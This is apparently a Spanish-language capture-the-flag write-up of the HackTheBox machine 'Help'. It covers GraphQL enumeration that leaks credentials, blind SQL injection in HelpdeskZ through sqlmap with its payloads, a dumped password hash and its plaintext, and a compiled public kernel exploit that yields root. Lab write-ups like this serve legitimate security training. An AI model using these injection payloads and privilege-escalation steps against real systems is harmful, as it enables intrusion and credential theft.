---
tags:
title: Help - Easy (HTB)
permalink: /Help-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p22,80,3000 10.129.230.159
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-22 12:26 -0500
Nmap scan report for help.htb (10.129.230.159)
Host is up (0.56s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.61 seconds
```

## Website / Port 80

Nada de nada.

![image-center](/assets/images/Pasted image 20251222142703.png)

## Website / Port 3000

En la pagina que corre por el otro puerto me sale el siguiente mensaje.

![image-center](/assets/images/Pasted image 20251222142916.png)

### Graphql 

Enumerando con `dirsearch` es como descubrí, la ruta de `GraphQ`.

>`GraphQL` es un lenguaje de consulta de código abierto y un entorno de ejecución para `APIs`

```bash
dirsearch -u http://help.htb:3000
<SNIP>

[12:34:23] Starting: 
[12:36:21] 400 -   18B  - /graphql                                          
[12:36:21] 400 -   18B  - /graphql/                                         
[12:36:21] 400 -   18B  - /graphql/console                                  
[12:36:21] 400 -   18B  - /graphql/console/
[12:36:21] 400 -   18B  - /graphql/graphql                                  
[12:36:21] 400 -   18B  - /graphql/schema.json                              
[12:36:21] 400 -   18B  - /graphql/schema.xml
[12:36:21] 400 -   18B  - /graphql/schema.yaml                              
                                                                             
Task Completed
```
### Credentials

Si intercepto la petición con `Burpsuite` a cualquiera de estos `endpoints`, me pide un parámetro `query`, para enviar consultas, por lo que me ayude de este blog de [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html#basic-enumeration) para saber como enumerar usuarios.

![image-center](/assets/images/Pasted image 20251222144447.png)
### Crack password

Como vi un hash y un usuario, rompi el hash en paginas como `crackstation`.

![image-center](/assets/images/Pasted image 20251222144839.png)
## HelpdeskZ

Como la pagina del puerto `3000` en si no tiene un `endpoint` para loguearme, enumere directorios en el puerto `80`.

```bash
 gobuster dir -u http://help.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 200
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://help.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 301) [Size: 309] [--> http://help.htb/javascript/]
/support
```

En la ruta `/support` corre el servico de `HelpDeskZ`.

![image-center](/assets/images/Pasted image 20251222151122.png)
### Auth

Me logue con las credenciales que consegui.

![image-center](/assets/images/Pasted image 20251222151202.png)
### SQL Injection

Veo que en la seccion de `submit ticket` puedo crear un ticket y subir un archivo, el cual intente bypassearlo para poder subir un archivo `.php` con doble extension, pero el archivo parece estar hasheado cuando se sube y ademas con la hora actual en del servidor.

![image-center](/assets/images/Pasted image 20251222153818.png)

Si clickeo en el archivo que subí me descarga mi archivo, pero si en el ultimo parámetro `param[]` coloco un `1=2-- -` me sale el siguiente error.

![image-center](/assets/images/Pasted image 20251222164157.png)
### sqlmap

Por lo que automatice el proceso de listado de tablas y bases de datos con `sqlmap`.

```
sqlmap -r ticket_attachment.request --level 5 --risk 3 -p param[]
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.4#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:33:15 /2019-06-04/

[17:33:15] [INFO] parsing HTTP request from 'ticket_attachment.request'
[17:33:15] [INFO] testing connection to the target URL
[17:33:15] [INFO] testing if the target URL content is stable
[17:33:16] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
[17:33:16] [WARNING] heuristic (basic) test shows that GET parameter 'param[]' might not be injectable
[17:33:16] [INFO] testing for SQL injection on GET parameter 'param[]'
[17:33:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:33:17] [INFO] GET parameter 'param[]' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --not-string="go")
[17:33:19] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
...[snip]...
[17:33:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[17:33:38] [INFO] GET parameter 'param[]' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
[17:33:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:33:38] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[17:33:38] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[17:33:39] [INFO] target URL appears to have 9 columns in query
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 
[17:33:51] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
[17:33:53] [INFO] target URL appears to be UNION injectable with 9 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 
...[snip]...
[17:34:23] [INFO] checking if the injection point on GET parameter 'param[]' is a false positive
GET parameter 'param[]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 433 HTTP(s) requests:
---
Parameter: param[] (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 AND 6277=6277

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 AND SLEEP(5)
---
[12:24:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.12
[12:25:29] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.121'
```

## Shell as help

Use el comando `--dump` para dumpear todo el contenido de la base de datos.

```bash
Database: support
Table: staff
[1 entry]
+----+-------+------------+--------------------+--------+--------+----------+---------------+----------+-----------------------------------------------------+--------------------------------+------------+--------------------+------------------------+                     
| id | admin | login      | email              | status | avatar | username | fullname      | timezone | password                                            | signature                      | last_login | department         | newticket_notification |                     
+----+-------+------------+--------------------+--------+--------+----------+---------------+----------+-----------------------------------------------------+--------------------------------+------------+--------------------+------------------------+                     
| 1  | 1     | 1547216217 | support@mysite.com | Enable | NULL   | admin    | Administrator | <blank>  | d318f44739dced66793b1a603028133a76ae680e (Welcome1) | Best regards,\r\nAdministrator | 1543429746 | a:1:{i:0;s:1:"1";} | 0                      |                     
+----+-------+------------+--------------------+--------+--------+----------+---------------+----------+-----------------------------------------------------+--------------------------------+------------+--------------------+------------------------+ 
```

Y ahora con las credenciales, probé con el mismo usuario de la pagina `(helpme)`, `admin`, pero con el usuario `help` me funcionaron.

```bash
ssh help@help.htb
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
help@help.htb's password: 
Permission denied, please try again.
help@help.htb's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-116-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have new mail.
Last login: Fri Jan 11 06:18:50 2019
help@help:~$ cat user.txt 
490c8f4a924f26687bd8b994301e0eca
```
## Shell as root

Viendo las versión del `kernel`, veo que el algo vieja.

```bash
help@help:/tmp$ uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

Buscando por su versión encontré este [Enlace](https://www.exploit-db.com/exploits/44298) con un script en `C` el cual automatiza el proceso para poder elevar mis privilegios a `root`, meto el contenido dentro de un archivo, y luego con `gcc` lo compilo.

```bash
help@help:/tmp$ nano ex.c
help@help:/tmp$ gcc -o exploit ex.c
```
### Shell

Veo que el script me lo creo correctamente.
```
help@help:/tmp$ ls
ex.c     root.pm
exploit  systemd-private-2a8c92d0b6c040f2943de41794d3f548-systemd-timesyncd.service-oCkgut
VMwareDnD
```

Y ahora solo que me queda ejecutarlo.

```bash
help@help:/tmp$ ./exploit 
task_struct = ffff88001c5dc600
uidptr = ffff880036f3d904
spawning root shell
root@help:/tmp# cat /root/root.txt 
e10f05e1b34a2e833cf51b91f7cf64e3
```

`~Happy Hacking.`

``